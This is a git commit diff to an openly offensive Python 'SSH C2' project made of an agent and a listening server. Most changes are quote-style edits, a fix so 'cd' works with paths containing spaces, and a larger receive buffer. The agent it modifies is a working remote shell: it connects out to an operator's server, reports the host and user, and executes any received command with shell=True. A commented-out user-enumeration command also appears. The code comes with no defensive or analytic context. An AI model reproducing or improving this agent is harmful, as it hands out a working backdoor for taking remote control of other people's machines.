d7ba131500510f0abb4ff7fdb879446c67e6c2a2
aCursedComrade <loshanaaloka27@gmail.com>
2022-04-23 16:25:47 +0530

    Fixed improper use of paths with spaces in names

--- agent.py
+++ agent.py
@@ -9,8 +9,8 @@ import argparse
 
 parser = argparse.ArgumentParser(description="SSH C2 agent configuration to communicate with server")
 parser._action_groups.pop()
-required = parser.add_argument_group('Required')
-optional = parser.add_argument_group('Optional')
+required = parser.add_argument_group("Required")
+optional = parser.add_argument_group("Optional")
 required.add_argument("-ip", dest="ip", help="Server IP")
 optional.add_argument("-p", dest="port", type=int, default=2222, help="Server port (Default: 2222)")
 optional.add_argument("-u", dest="user", default="sshUser", help="User to authenticate (Default: sshUser)")
@@ -35,24 +35,24 @@ def SSH_comm():
         host = socket.gethostname()
         user = getpass.getuser()
     except Exception as ex:
-        print('[!] Error, possible invalid sever details. Use -h for help.')
-        #print('Debug info:\n' + str(ex))
+        print("[!] Error, possible invalid sever details. Use -h for help.")
+        #print("Debug info:\n" + str(ex))
         sys.exit()
 
     if start_session.active:
-        start_session.send(f'[*] Agent checked in from \"{host}\" as \"{user}\".\n')
+        start_session.send(f"[*] Agent checked in from \"{host}\" as \"{user}\".\n")
         print(start_session.recv(1024).decode())
         while True:
             incoming = start_session.recv(1024)
             try:
                 command = incoming.decode()
-                if command == 'exit':
+                if command == "exit":
                     sys.exit()
-                if command.split(" ")[0] == 'cd':
-                    path = command.split(" ")[1]
+                if command.split(" ")[0] == "cd":
+                    path = " ".join(command.split(" ")[1:])
                     os.chdir(path)
                     CWD = os.getcwd()
-                    start_session.send(f'[*] Changed directory to {CWD}\n')
+                    start_session.send(f"[*] Changed directory to {CWD}\n")
                 else:
                     #command_out = subprocess.check_output(shlex.split(command), stderr=subprocess.STDOUT, shell=True)
                     command_out = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True)
@@ -62,7 +62,7 @@ def SSH_comm():
                     else:
                         start_session.send(command_out)
             except Exception as ex:
-                start_session.send('[!] ' + str(ex) + '\n')
+                start_session.send("[!] " + str(ex) + "\n")
                 pass
     return
 
--- sshserver.py
+++ sshserver.py
@@ -6,8 +6,8 @@ import argparse
 
 parser = argparse.ArgumentParser(description="SSH C2 server configuration to listen for agents")
 parser._action_groups.pop()
-required = parser.add_argument_group('Required')
-optional = parser.add_argument_group('Optional')
+required = parser.add_argument_group("Required")
+optional = parser.add_argument_group("Optional")
 required.add_argument("-f", dest="key_file", help="Key File")
 optional.add_argument("-p", dest="port", type=int, default=2222, help="Port to listen (Default: 2222)")
 optional.add_argument("-u", dest="user", default="sshUser", help="Server user (Default: sshUser)")
@@ -21,7 +21,7 @@ args = parser.parse_args()
 
 class SSHServer (paramiko.ServerInterface):
     def check_channel_request(self, kind, chanid):
-        if kind == 'session':
+        if kind == "session":
             return paramiko.OPEN_SUCCEEDED
         return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED
     def check_auth_password(self, username, password):
@@ -30,7 +30,7 @@ class SSHServer (paramiko.ServerInterface):
         return paramiko.AUTH_FAILED
 
 def main():
-    server = '0.0.0.0' #To listen on all interfaces
+    server = "0.0.0.0" #To listen on all interfaces
     port = args.port
     #CWD = os.getcwd()
     HOSTKEY = paramiko.RSAKey(filename=os.path.join(args.key_file)) #Provide private Key File via -f flag
@@ -40,7 +40,7 @@ def main():
         sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         sock.bind((server, port))
         sock.listen()
-        print('[*] Listening for connections...')
+        print("[*] Listening for connections...")
         client, addr = sock.accept()
     except KeyboardInterrupt:
         quit()
@@ -49,13 +49,13 @@ def main():
     server = SSHServer()
     C2_Session.start_server(server=server)
     chan = C2_Session.accept()
-    print('[*] Debug info:\n' + str(chan)) #Debug info
+    print("[*] Debug info:\n" + str(chan)) #Debug info
     if chan is None:
-        print('[!] Failled authentication.')
+        print("[!] Failled authentication.")
         sys.exit()
     success_msg = chan.recv(1024).decode()
-    print(f'{success_msg}')
-    chan.send(' ') #Connection breaks without this line
+    print(f"{success_msg}")
+    chan.send(" ") #Connection breaks without this line
     def comm_handler():
         try:
             while True:
@@ -63,21 +63,21 @@ def main():
                 command = input(cmd_line + "")
                 """
                 if command == "get_users":
-                    command = ('wmic useraccount list breif')
+                    command = ("wmic useraccount list breif")
                     chan.send(command)
                     output = chan.recv(8192)
                     print(output.decode())
                     continue
                 """ #A pre-defined set of commands, based on where (OS) it will be executed
-                if command == '':
+                if command == "":
                     comm_handler()
-                if command == 'exit':
+                if command == "exit":
                     chan.send(command)
                     sys.exit()
                 else:
                     try:
                         chan.send(command)
-                        output = chan.recv(10240)
+                        output = chan.recv(102400)
                         print(output.decode())
                     except SystemError:
                         pass
@@ -85,11 +85,11 @@ def main():
             print(str(ex))
             pass
         except KeyboardInterrupt:
-            chan.send('exit')
+            chan.send("exit")
             sys.exit()
     comm_handler()
 
-if __name__ == '__main__':
+if __name__ == "__main__":
     try:
         main()
     except Exception as ex:
